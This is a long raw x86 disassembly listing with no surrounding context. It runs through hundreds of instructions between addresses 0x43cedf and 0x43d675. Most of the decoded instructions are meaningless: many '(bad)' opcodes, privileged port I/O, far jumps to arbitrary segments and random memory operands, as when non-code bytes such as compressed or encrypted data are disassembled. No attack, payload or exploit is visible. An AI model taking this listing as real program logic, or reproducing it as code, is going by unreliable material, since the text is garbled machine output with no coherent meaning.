  43cedf:	div    BYTE PTR [ebp-0x72]
  43cee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cee3:	out    0xc2,al
  43cee5:	inc    ecx
  43cee6:	pop    edx
  43cee7:	push   esi
  43cee8:	sbb    ebx,DWORD PTR [ecx+0x2]
  43ceeb:	and    eax,0xf938c747
  43cef0:	sbb    al,0xb8
  43cef2:	dec    ebx
  43cef3:	sbb    ecx,edi
  43cef5:	add    DWORD PTR [ecx],edi
  43cef7:	jl     0x43ce7d
  43cef9:	mov    ds:0x5918dd01,al
  43cefe:	lds    eax,FWORD PTR [esi]
  43cf00:	sub    BYTE PTR [edi-0x5a4056c7],dl
  43cf06:	frstpm(287 only) 
  43cf08:	cld    
  43cf09:	sbb    al,0xf5
  43cf0b:	shl    esi,1
  43cf0d:	sub    al,0xaa
  43cf0f:	jnp    0x43cee0
  43cf11:	outs   dx,BYTE PTR ds:[esi]
  43cf12:	adc    eax,0xbd7a70d7
  43cf17:	inc    esp
  43cf18:	lahf   
  43cf19:	cdq    
  43cf1a:	jmp    0x43cf01
  43cf1c:	arpl   WORD PTR [edi],di
  43cf1e:	ds push 0x791f5e00
  43cf24:	pop    ds
  43cf25:	mov    ecx,0x327afbf7
  43cf2a:	mov    cl,0x76
  43cf2c:	in     eax,0xa3
  43cf2e:	imul   edi,DWORD PTR [esi],0x7
  43cf31:	xor    dl,bh
  43cf33:	shl    DWORD PTR [ecx+edx*8-0x3a],1
  43cf37:	mov    ebp,0xb4b68f99
  43cf3c:	fidiv  DWORD PTR [ecx]
  43cf3e:	aad    0x40
  43cf40:	jge    0x43cee6
  43cf42:	jnp    0x43cf08
  43cf44:	cli    
  43cf45:	rcr    DWORD PTR [ecx-0x5fde92af],0x12
  43cf4c:	and    ah,BYTE PTR [esi+edi*4]
  43cf4f:	je     0x43cfb8
  43cf51:	call   0xa1098386
  43cf56:	ret    
  43cf57:	repz push eax
  43cf59:	and    eax,0x5919347f
  43cf5e:	xor    edi,DWORD PTR gs:[ecx+eiz*1]
  43cf62:	mov    al,ds:0x5ba5ee28
  43cf67:	je     0x43cfe2
  43cf69:	icebp  
  43cf6a:	repnz in eax,0x36
  43cf6d:	cdq    
  43cf6e:	in     eax,0x16
  43cf70:	jmp    0x43cf55
  43cf72:	mov    bh,0xb4
  43cf74:	jb     0x43cf7b
  43cf76:	or     dl,bl
  43cf78:	xlat   BYTE PTR ds:[ebx]
  43cf79:	mov    bl,0x5c
  43cf7b:	(bad)  
  43cf7c:	cld    
  43cf7d:	gs shr bh,0xe4
  43cf81:	cdq    
  43cf82:	adc    BYTE PTR [ecx+0x5026bc49],0x65
  43cf89:	repz mov dh,0xef
  43cf8c:	out    dx,eax
  43cf8d:	test   eax,0xe9240438
  43cf92:	enter  0xeda7,0x1
  43cf96:	out    0x24,al
  43cf98:	and    bh,cl
  43cf9a:	sub    ecx,edx
  43cf9c:	outs   dx,BYTE PTR ds:[esi]
  43cf9d:	sub    al,0x9b
  43cf9f:	or     DWORD PTR [edx-0x6423548],ebx
  43cfa5:	mov    DWORD PTR [eax-0x4a],ebp
  43cfa8:	das    
  43cfa9:	cdq    
  43cfaa:	or     esp,DWORD PTR [esi]
  43cfac:	or     eax,0xb5c09d5f
  43cfb1:	and    ah,al
  43cfb3:	in     al,0x35
  43cfb5:	mov    bh,0xf
  43cfb7:	dec    edi
  43cfb8:	inc    edx
  43cfb9:	dec    ecx
  43cfba:	xor    BYTE PTR [edx],0x22
  43cfbd:	pop    es
  43cfbe:	jmp    0xb5eb:0xfd86515f
  43cfc5:	enter  0xefa0,0x70
  43cfc9:	outs   dx,BYTE PTR cs:[esi]
  43cfcb:	inc    edi
  43cfcc:	sbb    BYTE PTR [ecx-0x4ea15643],bl
  43cfd2:	mov    ebp,0xaa40d790
  43cfd7:	ins    DWORD PTR es:[edi],dx
  43cfd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cfd9:	push   esp
  43cfda:	cdq    
  43cfdb:	jmp    0xf921:0x8c3a8ecf
  43cfe2:	inc    eax
  43cfe3:	add    eax,0x9f2be32e
  43cfe8:	pop    edx
  43cfe9:	fdivr  QWORD PTR ds:0x3ba3818e
  43cfef:	popf   
  43cff0:	add    bh,BYTE PTR ds:0xb91744cc
  43cff6:	add    esi,DWORD PTR ds:0x7d5bfa2e
  43cffc:	xchg   ebx,eax
  43cffd:	mov    ds:0x1c4351db,eax
  43d002:	jmp    0xfa58:0xa067fc94
  43d009:	repnz nop
  43d00b:	add    eax,0xe7b95d9b
  43d010:	mov    bl,0xb1
  43d012:	mov    edi,DWORD PTR [edi]
  43d014:	and    DWORD PTR [esi-0x5cbba82f],esp
  43d01a:	outs   dx,BYTE PTR ds:[esi]
  43d01b:	(bad)  
  43d01c:	and    BYTE PTR [ecx-0x33],bl
  43d01f:	cmp    BYTE PTR [ebp+0x22],bh
  43d022:	dec    ebx
  43d023:	dec    esi
  43d024:	xlat   BYTE PTR ds:[ebx]
  43d025:	ins    DWORD PTR es:[edi],dx
  43d026:	mov    al,BYTE PTR [edx-0x1]
  43d029:	adc    eax,0xd88312bc
  43d02e:	inc    ecx
  43d02f:	and    edi,DWORD PTR [eax+0x20e6d72d]
  43d035:	mov    eax,0x72d169e3
  43d03a:	mov    dl,0x14
  43d03c:	imul   ebx,DWORD PTR [edx],0xffffffa4
  43d03f:	ret    
  43d040:	add    eax,0x3ffa13ef
  43d045:	push   eax
  43d046:	fdiv   QWORD PTR [ebp+0x33]
  43d049:	mov    bl,0xb7
  43d04b:	scas   al,BYTE PTR es:[edi]
  43d04c:	or     cl,ch
  43d04e:	sub    al,0x65
  43d050:	test   eax,0x752e915c
  43d055:	sbb    dl,dl
  43d057:	out    dx,eax
  43d058:	sahf   
  43d059:	push   ecx
  43d05a:	(bad)  
  43d05b:	sbb    dl,dh
  43d05d:	mov    dh,BYTE PTR [ebp+0x5b86f6f4]
  43d063:	adc    dh,BYTE PTR [ebp-0x6e0fdf27]
  43d069:	dec    eax
  43d06a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d06b:	add    eax,0x4d0dc101
  43d070:	and    dh,BYTE PTR [esi]
  43d072:	mov    esp,0xd50381f4
  43d077:	js     0x43d020
  43d079:	fisubr DWORD PTR ds:[ebp+eiz*1+0x10f1147e]
  43d081:	cmp    BYTE PTR [ecx-0x4669836a],ch
  43d087:	xor    al,0x35
  43d089:	and    al,ch
  43d08b:	(bad)  
  43d08c:	jne    0x43d0fb
  43d08e:	stos   DWORD PTR es:[edi],eax
  43d08f:	jmp    0x923:0x3257dc4f
  43d096:	pop    ecx
  43d097:	lods   al,BYTE PTR ds:[esi]
  43d098:	rcr    BYTE PTR [esp+edx*8-0xa],1
  43d09c:	bt     ebx,ebx
  43d09f:	test   al,0xc
  43d0a1:	cwde   
  43d0a2:	lods   eax,DWORD PTR ds:[esi]
  43d0a3:	sbb    DWORD PTR ds:0x59210a1e,0xb124b9a3
  43d0ad:	adc    ecx,DWORD PTR [ebx]
  43d0af:	dec    edi
  43d0b0:	out    0xf2,al
  43d0b2:	jo     0x43d0b6
  43d0b4:	and    dl,BYTE PTR [eax]
  43d0b6:	dec    esp
  43d0b7:	fsub   st,st(4)
  43d0b9:	test   DWORD PTR [eax+0x7ba22431],esi
  43d0bf:	test   eax,0xd60458e0
  43d0c4:	push   esi
  43d0c5:	sub    BYTE PTR [edx+esi*2+0x6cc06290],0xa3
  43d0cd:	sahf   
  43d0ce:	mov    edi,0xd6c0555e
  43d0d3:	loopne 0x43d140
  43d0d5:	stc    
  43d0d6:	add    bl,dh
  43d0d8:	dec    eax
  43d0d9:	cmc    
  43d0da:	mov    ah,0x4
  43d0dc:	addr16 jae 0x43d0bd
  43d0df:	mov    ch,0x65
  43d0e1:	mov    ah,0xf2
  43d0e3:	repnz popf 
  43d0e5:	cmp    esi,DWORD PTR [eax+edi*1+0x7f556bd6]
  43d0ec:	cs dec ecx
  43d0ee:	test   al,0x9d
  43d0f0:	pop    ds
  43d0f1:	outs   dx,BYTE PTR ds:[esi]
  43d0f2:	jmp    0xd251:0x3b9e31ee
  43d0f9:	adc    ah,bh
  43d0fb:	jo     0x43d08a
  43d0fd:	xor    eax,DWORD PTR [ecx-0x455e396f]
  43d103:	or     BYTE PTR fs:[edx+eax*2-0x32],0xd6
  43d109:	add    eax,0xed18de25
  43d10e:	jge    0x43d0fb
  43d110:	call   0xa5aef5c
  43d115:	gs mov edi,0xf81f2fd4
  43d11b:	xchg   ebx,eax
  43d11c:	je     0x43d0b7
  43d11e:	dec    ebx
  43d11f:	shl    BYTE PTR [edx-0x17],1
  43d122:	dec    ebp
  43d123:	(bad)  
  43d124:	arpl   di,ax
  43d126:	in     al,0xcb
  43d128:	jecxz  0x43d1a7
  43d12a:	mov    dh,0xd4
  43d12c:	dec    ecx
  43d12d:	cld    
  43d12e:	pushf  
  43d12f:	nop
  43d130:	pop    ss
  43d131:	call   0x10b8da3a
  43d136:	cli    
  43d137:	out    0x5d,eax
  43d139:	mov    edi,0xce297cdd
  43d13e:	das    
  43d13f:	xor    eax,0xcd79bc22
  43d144:	stos   DWORD PTR es:[edi],eax
  43d145:	test   DWORD PTR [edi-0x69],ebp
  43d148:	cdq    
  43d149:	inc    esi
  43d14a:	push   ss
  43d14b:	fs icebp 
  43d14d:	push   0xffffffd7
  43d14f:	adc    al,0x17
  43d151:	cmovnp eax,DWORD PTR [esi]
  43d154:	xor    edi,DWORD PTR [ecx-0x4e]
  43d157:	mov    dl,0x1e
  43d159:	stos   BYTE PTR es:[edi],al
  43d15a:	cmp    edx,ebx
  43d15c:	fiadd  WORD PTR ds:0x2077a73e
  43d162:	test   eax,0x86dc39c0
  43d167:	rep outs dx,BYTE PTR ds:[esi]
  43d169:	test   BYTE PTR [ecx+0x7e],dl
  43d16c:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  43d16e:	stos   DWORD PTR es:[edi],eax
  43d16f:	fdivr  DWORD PTR [ecx]
  43d171:	jbe    0x43d15c
  43d173:	and    eax,0x8f9ba830
  43d178:	retf   0x3382
  43d17b:	test   BYTE PTR [ebp+0x56],al
  43d17e:	mov    al,ds:0xb43fb7f7
  43d183:	push   esp
  43d184:	cmp    ebp,DWORD PTR ds:[edx]
  43d187:	sbb    al,0xc5
  43d189:	pop    ecx
  43d18a:	push   eax
  43d18b:	jmp    0x5922:0x873b46ad
  43d192:	gs stos BYTE PTR es:[edi],al
  43d194:	mov    dh,0x8a
  43d196:	xor    al,BYTE PTR [edx]
  43d198:	clc    
  43d199:	mov    eax,ds:0x733c085b
  43d19e:	pop    es
  43d19f:	arpl   WORD PTR [edx+0x42],si
  43d1a2:	data16 int3 
  43d1a4:	mov    esi,es
  43d1a6:	fnstenv [ebx+ebx*4-0x64]
  43d1aa:	lahf   
  43d1ab:	mov    dl,0xc1
  43d1ad:	sahf   
  43d1ae:	fwait
  43d1af:	mov    ds:0x16a00018,eax
  43d1b4:	jns    0x43d1dd
  43d1b6:	dec    esi
  43d1b7:	test   eax,0x34b8cc2d
  43d1bc:	sti    
  43d1bd:	outs   dx,DWORD PTR ds:[esi]
  43d1be:	cld    
  43d1bf:	scas   eax,DWORD PTR es:[edi]
  43d1c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d1c1:	movsx  ebx,BYTE PTR [ecx]
  43d1c4:	mov    dl,0x90
  43d1c6:	sti    
  43d1c7:	mul    DWORD PTR [ebx]
  43d1c9:	loopne 0x43d1f4
  43d1cb:	inc    ebp
  43d1cc:	pop    ss
  43d1cd:	xor    al,0xfc
  43d1cf:	lock push ds
  43d1d1:	and    esi,DWORD PTR [eax-0xd86e39f]
  43d1d7:	mov    edx,0x3bef0389
  43d1dc:	cs jns 0x43d1f2
  43d1df:	mov    eax,ds:0x68a2aead
  43d1e4:	and    eax,eax
  43d1e6:	inc    edx
  43d1e7:	sbb    eax,0xf5b50465
  43d1ec:	adc    esp,DWORD PTR [edx+eiz*1-0x22f4c368]
  43d1f3:	out    dx,eax
  43d1f4:	(bad)  
  43d1f5:	mov    cl,0xb3
  43d1f7:	push   esp
  43d1f8:	lods   al,BYTE PTR ds:[esi]
  43d1f9:	nop
  43d1fa:	sahf   
  43d1fb:	cmp    BYTE PTR [ebp+0x1b],dh
  43d1fe:	mov    bh,0xe8
  43d200:	mov    bh,0x6b
  43d202:	fst    st(3)
  43d204:	pop    ds
  43d205:	test   eax,0xd99f3c6a
  43d20a:	mov    ecx,0x2f5ac1ff
  43d20f:	push   ebp
  43d210:	cmp    al,0xf1
  43d212:	(bad)  
  43d213:	jns    0x43d248
  43d215:	mov    dh,0xdf
  43d217:	jnp    0x43d291
  43d219:	cmc    
  43d21a:	mov    bl,0x88
  43d21c:	mov    edx,0x3824b57c
  43d221:	outs   dx,DWORD PTR ds:[esi]
  43d222:	cmp    cl,dh
  43d224:	and    eax,0x84f4d894
  43d229:	aam    0xc5
  43d22b:	cs xchg esp,eax
  43d22d:	inc    esi
  43d22e:	test   eax,0x73f89b34
  43d233:	xchg   esi,eax
  43d234:	arpl   WORD PTR [ebx-0x643b0b4e],di
  43d23a:	sti    
  43d23b:	stos   BYTE PTR es:[edi],al
  43d23c:	mov    edi,0x95fe8724
  43d241:	enter  0x2dbc,0x8a
  43d245:	cmp    DWORD PTR [ebx+0x10254e54],0x47
  43d24c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d24d:	inc    esi
  43d24e:	xor    al,BYTE PTR [edx]
  43d250:	push   esp
  43d251:	push   0x46c97360
  43d256:	sbb    eax,0xefa91feb
  43d25b:	cmp    esp,eax
  43d25d:	cs js  0x43d257
  43d260:	jbe    0x43d1ff
  43d262:	fwait
  43d263:	outs   dx,DWORD PTR ds:[esi]
  43d264:	fcomp  st(4)
  43d266:	les    eax,FWORD PTR [esi-0x53]
  43d269:	int    0x39
  43d26b:	inc    eax
  43d26c:	xor    ebx,DWORD PTR [ecx+0x13]
  43d26f:	inc    esp
  43d270:	mov    ds:0x1a58f282,al
  43d275:	(bad)  
  43d276:	retf   
  43d277:	or     ebp,ebp
  43d279:	call   0xc9c:0xbda33c6b
  43d280:	cld    
  43d281:	(bad)  
  43d282:	fsubp  st(1),st
  43d284:	or     al,al
  43d286:	js     0x43d2df
  43d288:	cwde   
  43d289:	pop    es
  43d28a:	sub    DWORD PTR [ebp-0x77],eax
  43d28d:	mov    bh,0xb7
  43d28f:	jle    0x43d2c8
  43d291:	ret    
  43d292:	pop    eax
  43d293:	mov    cl,0x3d
  43d295:	mov    DWORD PTR ds:0xcac7496d,esi
  43d29b:	mov    ebp,0x3abd0c29
  43d2a0:	sbb    BYTE PTR [edi-0x50],0xa4
  43d2a4:	in     eax,0x43
  43d2a6:	jmp    0x850d:0x4de5e72f
  43d2ad:	adc    DWORD PTR [ebp-0x518f360e],esi
  43d2b3:	add    esi,edi
  43d2b5:	fwait
  43d2b6:	pop    ebx
  43d2b7:	sub    dl,ch
  43d2b9:	push   ebx
  43d2ba:	cdq    
  43d2bb:	pushf  
  43d2bc:	mov    bh,0x9a
  43d2be:	sbb    ebx,DWORD PTR [ebp-0x2c162522]
  43d2c4:	adc    eax,0x97afffb1
  43d2c9:	retf   0x34b7
  43d2cc:	lahf   
  43d2cd:	add    ebp,eax
  43d2cf:	cs dec ecx
  43d2d1:	mov    ebx,0x38aaa53f
  43d2d6:	mov    cl,0x24
  43d2d8:	imul   ebp,ebx,0xffffffa5
  43d2db:	jecxz  0x43d31c
  43d2dd:	cwde   
  43d2de:	mov    al,0x22
  43d2e0:	loope  0x43d274
  43d2e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d2e3:	cwde   
  43d2e4:	std    
  43d2e5:	add    eax,DWORD PTR [edi]
  43d2e7:	jmp    0x8fc5:0x91ceafbd
  43d2ee:	(bad)  
  43d2ef:	in     eax,0xcd
  43d2f1:	or     eax,0xd058149e
  43d2f6:	std    
  43d2f7:	outs   dx,DWORD PTR ds:[esi]
  43d2f8:	(bad)  
  43d2fa:	out    dx,eax
  43d2fb:	and    al,0x3b
  43d2fd:	mov    ds:0xa3a94974,eax
  43d302:	sbb    esp,DWORD PTR [ecx]
  43d304:	mov    esp,0xcc02c035
  43d309:	push   ecx
  43d30a:	mov    ds:0x93e8f408,eax
  43d30f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d310:	retf   0x783
  43d313:	xor    esp,ebp
  43d315:	addr16 mov eax,ds:0x48f4
  43d319:	loopne 0x43d2d3
  43d31b:	push   edx
  43d31c:	xor    ebx,DWORD PTR ds:0x249464e1
  43d322:	fucomi st,st(6)
  43d324:	jmp    0x156d:0x40f2dba3
  43d32b:	and    bh,BYTE PTR [ecx+0x2]
  43d32e:	inc    ecx
  43d32f:	je     0x43d320
  43d331:	xor    eax,0x5a7424b7
  43d336:	pop    edx
  43d337:	gs inc ebp
  43d339:	xlat   BYTE PTR ds:[ebx]
  43d33a:	mov    dh,dh
  43d33c:	add    edi,ebx
  43d33e:	xor    DWORD PTR [ecx-0x11bb527d],esp
  43d344:	sbb    esp,DWORD PTR [ecx+eiz*4+0x46]
  43d348:	xchg   esi,eax
  43d349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d34a:	inc    ebx
  43d34b:	mov    cl,0x2b
  43d34d:	sbb    eax,0x82e694cc
  43d352:	or     eax,DWORD PTR [edx-0x6a245718]
  43d358:	int3   
  43d359:	ror    DWORD PTR fs:[eax*1+0x22f44398],0x81
  43d362:	xor    eax,ecx
  43d364:	pop    ds
  43d365:	or     DWORD PTR ds:0x3c3603cf,ecx
  43d36b:	int3   
  43d36c:	sub    BYTE PTR [eax-0x3ef41545],0x21
  43d373:	inc    edi
  43d374:	pop    esi
  43d375:	mov    gs,esi
  43d377:	out    dx,al
  43d378:	scas   al,BYTE PTR es:[edi]
  43d379:	mov    edi,0x928a54b8
  43d37e:	sti    
  43d37f:	jo     0x43d3d6
  43d381:	dec    edi
  43d382:	sub    bh,0xe8
  43d385:	out    dx,eax
  43d386:	mov    bl,0xe9
  43d388:	push   ss
  43d389:	jmp    0x5a35ecdd
  43d38e:	fdiv   st,st(5)
  43d390:	or     al,0xa5
  43d392:	cmp    edi,ebp
  43d394:	pop    es
  43d395:	clc    
  43d396:	gs popf 
  43d398:	loope  0x43d3ae
  43d39a:	inc    edi
  43d39b:	jmp    0x8b3d:0xb4b8a393
  43d3a2:	add    esi,esi
  43d3a4:	jbe    0x43d32e
  43d3a6:	out    dx,eax
  43d3a7:	bound  eax,QWORD PTR [edx+ebx*4+0x52fdbe80]
  43d3ae:	mov    ah,BYTE PTR [ecx]
  43d3b0:	push   edx
  43d3b1:	push   ebp
  43d3b2:	mov    dh,0x24
  43d3b4:	inc    eax
  43d3b5:	stos   DWORD PTR es:[edi],eax
  43d3b6:	mov    dl,0xd0
  43d3b8:	add    eax,0x76f52f0f
  43d3bd:	xor    eax,0x8a773ebf
  43d3c2:	mov    ds:0xbcc917e7,al
  43d3c7:	popf   
  43d3c8:	scas   al,BYTE PTR es:[edi]
  43d3c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d3ca:	dec    edx
  43d3cb:	mov    edx,0xfb8024eb
  43d3d0:	stc    
  43d3d1:	cdq    
  43d3d2:	int3   
  43d3d3:	jg     0x43d44f
  43d3d5:	sahf   
  43d3d6:	mov    ebx,0xd4084dd
  43d3db:	cmp    bl,BYTE PTR [ebx]
  43d3dd:	jmp    0xae17d5a6
  43d3e2:	add    bh,BYTE PTR [ebp+0x20]
  43d3e5:	scas   al,BYTE PTR es:[edi]
  43d3e6:	pop    ebx
  43d3e7:	test   BYTE PTR [edi-0x2b5d3257],bl
  43d3ed:	ror    BYTE PTR [edx],1
  43d3ef:	and    al,0x3b
  43d3f1:	cwde   
  43d3f2:	mov    bl,0x5e
  43d3f4:	(bad)  
  43d3f5:	sbb    al,0xb1
  43d3f7:	into   
  43d3f8:	sbb    al,0x3f
  43d3fa:	and    ch,dl
  43d3fc:	and    eax,0xc87630e2
  43d401:	mov    al,ds:0x58a2ef4b
  43d406:	mov    al,0x8b
  43d408:	push   eax
  43d409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d40a:	nop
  43d40b:	or     esi,DWORD PTR [bx+di-0x49]
  43d40f:	adc    al,0x5f
  43d411:	adc    al,0x31
  43d413:	pop    ebx
  43d414:	test   DWORD PTR [esp+esi*8-0x452cbaba],0x51d3a9ef
  43d41f:	ret    0xac27
  43d422:	and    eax,0x64ab20f5
  43d427:	push   ecx
  43d428:	popf   
  43d429:	sahf   
  43d42a:	fwait
  43d42b:	lods   eax,DWORD PTR ds:[esi]
  43d42c:	push   ds
  43d42d:	(bad)  
  43d42e:	xor    al,0xb1
  43d430:	and    BYTE PTR [edi+0x4bb72977],cl
  43d436:	cdq    
  43d437:	cmc    
  43d438:	adc    cl,BYTE PTR ds:0xc117de2e
  43d43e:	enter  0xc072,0x9e
  43d442:	retf   
  43d443:	mov    ecx,0x5274fa0a
  43d448:	sbb    edx,ebx
  43d44a:	add    BYTE PTR [esi-0x7a327fe],dh
  43d450:	and    DWORD PTR [ecx-0x1],edi
  43d453:	inc    ebx
  43d454:	int3   
  43d455:	stos   DWORD PTR es:[edi],eax
  43d456:	popf   
  43d457:	mov    cl,0x25
  43d459:	in     al,dx
  43d45a:	jecxz  0x43d44c
  43d45c:	(bad)  
  43d45e:	and    dl,dh
  43d460:	pop    ds
  43d461:	sub    DWORD PTR [ebx-0x4d9f36bc],esp
  43d467:	jmp    0x43d447
  43d469:	bound  edi,QWORD PTR [ebp-0x5f72bc94]
  43d46f:	fstp   DWORD PTR ds:0xf05f6a59
  43d475:	xchg   ecx,eax
  43d476:	add    DWORD PTR [eax-0x21],0xeee4b970
  43d47d:	arpl   ax,ax
  43d47f:	sub    BYTE PTR [ebp+0x27f96f27],dl
  43d485:	jns    0x43d504
  43d487:	ret    0xc82
  43d48a:	cmp    DWORD PTR [eax-0x2b454683],esi
  43d490:	adc    ebx,ebx
  43d492:	outs   dx,BYTE PTR ds:[esi]
  43d493:	hlt    
  43d494:	inc    ebp
  43d495:	shl    DWORD PTR [edx-0x17],0x5b
  43d499:	inc    edx
  43d49a:	add    al,0x36
  43d49c:	and    al,0x69
  43d49e:	mov    ds:0x41b88c60,eax
  43d4a3:	dec    esi
  43d4a4:	aas    
  43d4a5:	sahf   
  43d4a6:	dec    ebx
  43d4a7:	mov    ebp,0x76e947a1
  43d4ac:	jmpw   0x1c90
  43d4b0:	dec    ecx
  43d4b1:	jle    0x43d52e
  43d4b3:	(bad)  
  43d4b4:	mov    dl,BYTE PTR [edx]
  43d4b6:	fdivp  st(4),st
  43d4b8:	int    0x77
  43d4ba:	nop
  43d4bb:	icebp  
  43d4bc:	mov    ebp,0x7d2d3b9f
  43d4c1:	icebp  
  43d4c2:	dec    edx
  43d4c3:	aas    
  43d4c4:	mov    edx,0x55c81cb2
  43d4c9:	nop
  43d4ca:	mov    eax,0x4f2291c4
  43d4cf:	ins    BYTE PTR es:[edi],dx
  43d4d0:	mov    edi,0x346b3d6f
  43d4d5:	lahf   
  43d4d6:	out    dx,eax
  43d4d7:	pop    ss
  43d4d8:	sbb    BYTE PTR [ebx],bh
  43d4da:	and    BYTE PTR [ecx],bl
  43d4dc:	and    ebx,DWORD PTR [ecx-0x69]
  43d4df:	sbb    al,0x59
  43d4e1:	dec    DWORD PTR [ebx-0x545dc66a]
  43d4e7:	sub    ch,BYTE PTR [ecx+0x13d02c66]
  43d4ed:	loopne 0x43d548
  43d4ef:	inc    ecx
  43d4f0:	ret    0x38d7
  43d4f3:	and    esp,DWORD PTR [eax]
  43d4f5:	dec    ecx
  43d4f6:	sub    bl,BYTE PTR [ebp+eiz*1+0x7e]
  43d4fa:	inc    ecx
  43d4fb:	sub    esi,ebx
  43d4fd:	ficomp DWORD PTR ds:0x1f87175b
  43d503:	test   BYTE PTR [esi+0x71],0x77
  43d507:	adc    BYTE PTR [edx],ch
  43d509:	push   0x28
  43d50b:	xchg   ecx,eax
  43d50c:	fsubr  st(6),st
  43d50e:	mov    ah,0x92
  43d510:	outs   dx,BYTE PTR ds:[esi]
  43d511:	loopne 0x43d4ce
  43d513:	add    al,0x88
  43d515:	ret    
  43d516:	in     al,dx
  43d517:	retf   0xd8d6
  43d51a:	or     al,0xca
  43d51c:	and    eax,0xf62663a1
  43d521:	inc    ebx
  43d522:	jns    0x43d4df
  43d524:	ret    0xbfc7
  43d527:	fs cmp eax,0x3676e9b2
  43d52d:	add    al,0x58
  43d52f:	int3   
  43d530:	sbb    edx,DWORD PTR [edi-0x63]
  43d533:	push   ebp
  43d534:	push   ecx
  43d535:	sub    al,BYTE PTR [edi]
  43d537:	xchg   esi,eax
  43d538:	cmp    al,0x45
  43d53a:	mov    ecx,0xc159e7c4
  43d53f:	out    0x55,eax
  43d541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d542:	pop    ds
  43d543:	out    0x98,al
  43d545:	cmp    BYTE PTR [ebp-0x27a49a14],0x81
  43d54c:	sbb    al,0xf9
  43d54e:	and    eax,0xca6bbb95
  43d553:	adc    eax,0xf09b3945
  43d558:	call   0xd9ea:0xfe801542
  43d55f:	xchg   esi,eax
  43d560:	xchg   ebx,eax
  43d561:	cmp    eax,0xc22505d1
  43d566:	inc    ecx
  43d567:	ret    0x82de
  43d56a:	mov    ds:0x17157578,eax
  43d56f:	in     eax,dx
  43d570:	aam    0x8d
  43d572:	jp     0x43d5ce
  43d574:	sar    BYTE PTR [ebp+ebx*1+0x7c],0x65
  43d579:	lock sbb edx,esi
  43d57c:	idiv   ch
  43d57e:	(bad)  
  43d580:	test   DWORD PTR [edx+esi*1],edi
  43d583:	out    0xfe,eax
  43d585:	out    0x85,eax
  43d587:	inc    edx
  43d588:	and    BYTE PTR [ecx],cl
  43d58a:	jb     0x43d5fa
  43d58c:	pop    ds
  43d58d:	test   DWORD PTR [ebp+0x8],0xdfcba647
  43d594:	aas    
  43d595:	in     eax,0xc0
  43d597:	les    ebx,FWORD PTR [eax+0x1b]
  43d59a:	(bad)  
  43d59b:	push   eax
  43d59c:	fucom  st(6)
  43d59e:	pop    ss
  43d59f:	out    0xb9,eax
  43d5a1:	xor    BYTE PTR [ebp+0x1bb7a034],dh
  43d5a7:	jp     0x43d601
  43d5a9:	xor    cl,ah
  43d5ab:	and    DWORD PTR ss:[ebx+0x2a],esi
  43d5af:	pushf  
  43d5b0:	and    eax,0x1a4ed185
  43d5b5:	pop    ecx
  43d5b6:	icebp  
  43d5b7:	cs ja  0x43d547
  43d5ba:	mov    dh,0x6b
  43d5bc:	mov    ah,BYTE PTR [eax+0x320a56eb]
  43d5c2:	repnz lahf 
  43d5c4:	gs sub ch,cl
  43d5c7:	fmul   DWORD PTR [eax]
  43d5c9:	or     al,0xbe
  43d5cb:	xor    al,0xd1
  43d5cd:	adc    eax,0xd565f075
  43d5d2:	jns    0x43d5c7
  43d5d4:	pushf  
  43d5d5:	ins    BYTE PTR es:[edi],dx
  43d5d6:	push   edx
  43d5d7:	xchg   ecx,eax
  43d5d8:	pop    eax
  43d5d9:	stos   BYTE PTR es:[edi],al
  43d5da:	ins    BYTE PTR es:[edi],dx
  43d5db:	out    0xa6,al
  43d5dd:	mov    eax,ds:0x7ae2043b
  43d5e2:	movzx  esi,BYTE PTR [edi+0x16]
  43d5e6:	cmp    al,0x55
  43d5e8:	xchg   ecx,eax
  43d5e9:	sub    dh,dl
  43d5eb:	sub    eax,0xf15a0077
  43d5f0:	adc    ebx,DWORD PTR [edx]
  43d5f2:	pop    edi
  43d5f3:	ja     0x43d5ab
  43d5f5:	xchg   BYTE PTR [edx+0x18],bl
  43d5f8:	or     esi,DWORD PTR [ebp+eax*2+0x478c17f9]
  43d5ff:	pop    edi
  43d600:	xlat   BYTE PTR ds:[ebx]
  43d601:	test   DWORD PTR [ecx-0x3a37ea9c],ecx
  43d607:	out    0x3e,al
  43d609:	pop    ds
  43d60a:	fmul   QWORD PTR [ebx+0x31]
  43d60d:	xchg   BYTE PTR [edx+0x47283ef4],dh
  43d613:	in     eax,0xf5
  43d615:	pusha  
  43d616:	adc    al,0xeb
  43d618:	lock pop ss
  43d61a:	lods   eax,DWORD PTR ds:[esi]
  43d61b:	in     eax,dx
  43d61c:	sbb    eax,0xf76c6579
  43d621:	xchg   edi,eax
  43d622:	mov    dh,0x32
  43d624:	es test eax,0x8c090edb
  43d62a:	test   al,0x44
  43d62c:	and    ah,BYTE PTR [ebx-0x66e75948]
  43d632:	sbb    DWORD PTR [edi],eax
  43d634:	dec    esi
  43d635:	push   eax
  43d637:	les    ebx,FWORD PTR [edx]
  43d639:	into   
  43d63a:	fcomp  QWORD PTR [edi+0x7bab9db7]
  43d640:	nop
  43d641:	fcmovb st,st(6)
  43d643:	sbb    ch,BYTE PTR gs:[ecx-0x2f]
  43d647:	fimul  WORD PTR [ebx-0x6a]
  43d64a:	repz cdq 
  43d64c:	cdq    
  43d64d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d64e:	mov    edx,DWORD PTR [edi+0x56f03d3e]
  43d654:	sub    DWORD PTR [edi+0x3e573258],ebp
  43d65a:	mov    cl,0x54
  43d65c:	out    0x34,eax
  43d65e:	jmp    0xebe6246e
  43d663:	call   0x32a8a82d
  43d668:	clc    
  43d669:	inc    edx
  43d66a:	int    0x3c
  43d66c:	jp     0x43d6b5
  43d66e:	ja     0x43d658
  43d670:	xchg   ebp,eax
  43d671:	jo     0x43d67f
  43d673:	icebp  
  43d674:	(bad)  
  43d675:	nop
